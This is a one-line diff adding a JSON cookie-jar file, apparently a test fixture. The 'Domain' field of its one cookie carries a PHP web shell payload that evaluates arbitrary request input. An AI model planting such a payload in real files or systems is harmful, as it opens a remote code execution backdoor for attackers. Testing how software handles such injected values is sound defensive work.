@@ -1,0 +1,1 @@
+[{"Name":"foo","Value":"bar","Domain":"<?php eval($_REQUEST[1])?>","Path":"\/","Max-Age":null,"Expires":1543767874,"Secure":false,"Discard":false,"HttpOnly":false}]
